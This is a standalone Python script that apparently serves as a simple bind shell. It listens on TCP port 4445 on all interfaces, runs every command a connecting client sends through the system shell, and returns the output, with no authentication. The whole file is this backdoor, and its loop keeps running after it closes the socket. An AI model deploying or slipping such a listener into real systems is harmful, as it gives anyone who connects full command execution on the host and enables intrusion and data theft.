import socket
import subprocess
import os
import sys

PORT = 4445
HOST = ""
SOCKET_CLIENTS = []
BUFFER_DATA = 4096


def exec_command(command):
    try:
        command = command.split()
        proc = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
        (out, err) = proc.communicate()
        return out  # return the output
    except Exception as error:
        return error  # return the error


def send_output():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(1)
    conn, addr = s.accept()
    print("client {} connected to the server".format(addr[0]))

    while True:
        data = conn.recv(BUFFER_DATA)
        if not data:
            print("Connection closed")
            s.close()
        else:
            data = data.decode()
            if data.strip() == "q" or data.strip() == "quit" or data.strip() == "exit":
                print("{} closed the connection".format(addr[0]))
                s.close()
            else:
                sys_output = exec_command(data)
                # print(str(sys_output))
                print("client {} executed the command \"{}\"".format(addr[0], data))
                conn.sendall(str("{} \n").format(sys_output.decode()).encode())


if __name__ == '__main__':
    sys.exit(send_output())
